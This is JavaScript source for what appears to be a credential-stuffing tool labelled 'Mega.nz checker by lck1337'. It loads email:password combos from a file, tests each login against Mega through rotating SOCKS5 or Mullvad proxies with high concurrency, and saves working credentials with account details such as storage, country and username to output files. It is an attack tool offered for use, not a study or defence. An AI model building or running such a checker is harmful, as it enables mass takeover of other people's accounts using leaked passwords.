const fs = require('fs/promises');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const Checker = require('./structures/login');
const prompts = require('prompts');

let proxy;

class AccountChecker {
    constructor(concurrency) {
        this.concurrency = concurrency || 10;
        this.queue = [];
        this.running = 0;
        this.valid = 0;
    }

    printProgress() {
        process.stdout.clearLine(0);
        process.stdout.cursorTo(0);
        process.stdout.write(`in Queen: ${this.queue.length} | Running: ${this.running} | Valid: ${this.valid}`);
    }

    async processAccount(account) {
        this.printProgress();

        account.proxy =  proxy === null ? null : `socks5://${proxy[Math.floor(Math.random() *  proxy.length)]}`;
        this.running++;
        try {
            const chkr = new Checker(account);
			
          const code =  await chkr.Auth();

          if(code) {
            this.valid++;

			const date = new Date(code[0]?.since * 1000);

            const formatString = [
                "-----------------------------------------------",
                `Login details: ${account.email}:${account.password}`,
                "",
                `-  Account Type: ${code[2].type}`,
                `-  Disk: ${code[2].spaceUsed}/${code[2].spaceTotal} GB`,
                "",
                `-  Login version: ${code[1].version}`,
                `-  Account country: ${code[0].ipcc}`,
                `-  Registration date: ${date}`,
                `-  Username: ${code[0].name}`
            ];


		  await fs.appendFile('ValidAccounts.txt',  formatString.join('\n') + "\n");
          await fs.appendFile('ValidLoginPass.txt',  `${account.email}:${account.password}` + "\n");
          };
		  
        } catch (error) {
			this.running--;
            return this.processAccount(account);
        }
        this.printProgress();
        this.running--;
        this.dequeue();
    }

    enqueue(account) {
        this.queue.push(account);
        this.dequeue();
    }

    dequeue() {
        while (this.running < this.concurrency && this.queue.length > 0) {
            const account = this.queue.shift();
            this.processAccount(account);
        }
    }

    async checkAll(accounts) {
        accounts.forEach((account) => {
            this.enqueue(account);
        });

        while (this.running > 0) {
            await new Promise(resolve => setTimeout(resolve, 100));
        }

        console.log('All accounts checked.');
    }
}


const MullvadProxie = async () => {
    try {
    let Proxys = (await(await fetch('https://api.mullvad.net/www/relays/all/', {method: "get"})).json()).filter(x => x.active === true && typeof x.socks_name !== 'undefined').map(x => x.socks_name + ':1080');
    return Proxys;
    } catch(e) {
    console.log("Can't get proxy list from mullvad.net");
    return null;
    }
};

const Socks5 = async () => {
    const rawData = await fs.readFile('./proxy.txt', 'utf-8').catch(() => null);
  
    if(!rawData) {
        console.log("I can't read it proxy.txt");
        return null;
    }

    const data = rawData.replace(/\r/g, '').split('\n');
    return data;
};


const ChoiseSetting = async () => {
    
    const response = await prompts([
        {
            type: 'number',
            name: 'Threads',
            message: 'How many threads? (Optimally use 100)',
            initial: 1,
            style: 'default',
            min: 1,
            max: 9999999
          },
        {
          type: 'select',
          name: 'Proxy',
          message: 'Pick type proxy',
          choices: [
            { title: 'Mullvad Proxy', value: await MullvadProxie() },
            { title: 'Socks5', value: await Socks5() },
            { title: 'Not use proxy', value: null }
          ],
        }
    ]);

      if(response.Proxy === undefined) return await ChoiseSetting(); 
        return response;

};


const readBase = async () => {

    const rawData = await fs.readFile('./base.txt', 'utf-8').catch(() => null);
  
    if(!rawData) {
        console.log("I can't read it base.txt");
        process.exit();
    }

    const data = rawData.replace(/\r/g, '').split('\n');
    
    const accounts = data.map(x => ({ email: x.split(':')[0].toLowerCase() || "null", password: x.split(':')[1] || "null" }));

    return accounts;

};

(async () => {
  console.clear();
  console.log("Mega.nz checker by lck1337\n");
    
  const { Threads, Proxy } = await ChoiseSetting();
  proxy = Proxy;

  const accountChecker = new AccountChecker(Threads);
  console.clear();
  accountChecker.checkAll(await readBase());
})();
